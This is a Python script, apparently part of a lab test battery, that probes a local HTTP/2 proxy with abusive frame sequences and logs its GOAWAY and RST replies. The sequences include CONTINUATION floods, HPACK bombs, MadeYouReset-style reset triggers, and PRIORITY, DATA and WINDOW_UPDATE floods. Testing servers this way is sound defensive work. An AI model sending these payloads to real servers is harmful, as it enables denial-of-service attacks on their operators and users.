# SPDX-License-Identifier: GPL-2.0-or-later
# Quick protocol probe: what does the proxy answer to each abuse shape? (lab only: 127.0.0.1)
import socket, struct, sys, time
sys.path.insert(0, "/root/battery")
from clients import *
NAMES = {0:"DATA",1:"HEADERS",2:"PRIORITY",3:"RST_STREAM",4:"SETTINGS",5:"PUSH",6:"PING",7:"GOAWAY",8:"WINDOW_UPDATE",9:"CONTINUATION"}
def frames(buf):
    out=[]
    while len(buf)>=9:
        ln=int.from_bytes(buf[:3],"big"); t=buf[3]; fl=buf[4]; sid=int.from_bytes(buf[5:9],"big")&0x7fffffff
        if len(buf)<9+ln: break
        pl=buf[9:9+ln]; buf=buf[9+ln:]
        d=""
        if t==7: d=f"last={int.from_bytes(pl[:4],'big')} err={int.from_bytes(pl[4:8],'big')} {pl[8:40]!r}"
        elif t==3: d=f"err={int.from_bytes(pl[:4],'big')}"
        elif t==1: d=f"len={ln}"
        out.append(f"{NAMES.get(t,t)}(sid={sid},fl={fl:#x}) {d}")
    return out
def run(port, label, data, wait=1.0):
    s=socket.create_connection(("127.0.0.1",port)); s.sendall(PREFACE+settings()); time.sleep(0.2)
    try: s.sendall(data)
    except OSError as e: print(f"  {label}: send failed {e}")
    s.settimeout(wait); buf=b""; closed=False
    t0=time.time()
    while time.time()-t0<wait:
        try:
            d=s.recv(65536)
            if not d: closed=True; break
            buf+=d
        except socket.timeout: break
        except OSError as e: closed=f"err {e}"; break
    fr=frames(buf); summ={}
    for f in fr: k=f.split("(")[0]; summ[k]=summ.get(k,0)+1
    print(f"  {label}: {summ} closed={closed}; " + "; ".join(f for f in fr if "GOAWAY" in f or "RST" in f)[:300])
    s.close()
port=int(sys.argv[1])
print("CONTINUATION x 40 KiB (no END_HEADERS):")
run(port,"cont", frame(1,0,1,b"\x82\x86\x84\x41"+hpack_lit(b"battery")) + b"".join(frame(9,0,1,h2_hb_fields(1024)) for _ in range(40)))
run(port,"cont wrong sid", frame(1,0,1,b"\x82\x86\x84\x41"+hpack_lit(b"battery")) + frame(9,0,3,h2_hb_fields(1024)))
print("HPACK:")
run(port,"bomb setup+1 bomb", frame(1,0x5,1,b"\x82\x86\x84\x41"+hpack_lit(b"battery")+b"\x40"+hpack_lit(b"x-bomb")+hpack_lit(b"a"*4000)) + frame(1,0x5,3,b"\x82\x86\x84\x41"+hpack_lit(b"battery")+b"\xbe"*4000))
run(port,"table size 2^30", frame(1,0x5,1,hpack_int(1<<30,5,0x20)+b"\x82\x86\x84\x41"+hpack_lit(b"battery")))
print("MadeYouReset triggers (request + trigger):")
for k,name in enumerate(["WU0","PRIO self","DATA after ES","WU overflow","HEADERS after ES"]):
    trig=[frame(8,0,1,struct.pack(">I",0)), frame(2,0,1,struct.pack(">IB",1,16)), frame(0,0,1,b"x"), frame(8,0,1,struct.pack(">I",0x7fffffff)), h2_request(1,b"/?s=1k")][k]
    run(port,name, h2_request(1,b"/?s=1k")+trig)
print("frame floods:")
run(port,"1000 PRIORITY", b"".join(frame(2,0,1+2*k,struct.pack(">IB",0,16)) for k in range(1000)))
run(port,"POST + 1000 empty DATA", frame(1,0x4,1,b"\x83\x86\x84\x41"+hpack_lit(b"battery")) + frame(0,0,1,b"")*1000)
run(port,"req + 1000 WU+1", h2_request(1,b"/?s=10m") + (frame(8,0,1,struct.pack(">I",1))+frame(8,0,0,struct.pack(">I",1)))*500, 0.5)
run(port,"300 open POST streams", b"".join(frame(1,0x4,1+2*k,b"\x83\x86\x84\x41"+hpack_lit(b"battery")) for k in range(300)))
